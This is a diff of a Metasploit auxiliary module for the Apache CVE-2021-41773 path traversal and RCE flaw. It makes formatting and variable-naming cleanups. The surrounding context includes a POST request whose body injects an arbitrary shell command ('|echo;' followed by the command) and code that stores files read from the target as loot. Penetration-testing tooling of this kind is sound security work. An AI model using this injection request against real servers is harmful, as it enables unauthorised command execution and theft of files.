@@ -35,15 +35,21 @@ class MetasploitModule < Msf::Auxiliary
           'SSL' => true
         },
         'Actions' => [
-          ['Traversal', {
-            'Description' => 'Basic scanner for CVE-2021-41773 when mod_cgi is disabled.'
-          }],
-          ['RCE', {
-            'Description' => 'Basic scanner for CVE-2021-41773 when mod_cgi is enabled.'
-          }],
-          ['Read', {
-            'Description' => 'Exploit for CVE-2021-41773 to read local file on the remote server.'
-          }]
+          [
+            'Traversal', {
+              'Description' => 'Basic scanner for CVE-2021-41773 when mod_cgi is disabled.'
+            }
+          ],
+          [
+            'RCE', {
+              'Description' => 'Basic scanner for CVE-2021-41773 when mod_cgi is enabled.'
+            }
+          ],
+          [
+            'Read', {
+              'Description' => 'Exploit for CVE-2021-41773 to read local file on the remote server.'
+            }
+          ]
         ],
         'DefaultAction' => 'Traversal'
       )
@@ -61,7 +67,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def exec_traversal(cmd)
-    response = send_request_raw({
+    send_request_raw({
       'method' => 'POST',
       'uri' => normalize_uri(datastore['TARGETURI'], @traversal.to_s),
       'data' => "#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{cmd}"
@@ -75,7 +81,7 @@ class MetasploitModule < Msf::Auxiliary
     })
   end
 
-  def run_host(_ip)
+  def run_host(ip)
     @proto = (ssl ? 'https' : 'http')
 
     case action.name
@@ -143,7 +149,7 @@ class MetasploitModule < Msf::Auxiliary
       path = store_loot(
         'apache.traversal',
         'application/octet-stream',
-        _ip,
+        ip,
         response.body,
         datastore['FILEPATH']
       )
